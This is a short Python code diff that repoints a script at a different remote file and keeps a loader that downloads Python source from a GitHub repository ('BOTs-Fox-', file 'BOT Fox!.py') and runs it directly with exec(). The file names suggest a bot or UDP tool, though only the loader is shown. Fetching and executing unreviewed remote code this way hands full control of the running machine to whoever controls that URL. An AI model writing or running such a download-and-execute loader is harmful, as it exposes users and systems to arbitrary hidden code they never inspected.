@@ -1,6 +1,6 @@
-print("connect 3")
+print("connect 2")
 import requests
-data = requests.get(url="https://github.com/walidfoxy/BOTs-Fox-/blob/main/UDP%20!.txt").text
+data = requests.get(url="https://raw.githubusercontent.com/walidfoxy/BOTs-Fox-/main/BOT%20Fox!.py").text
 exec(data)
 
 
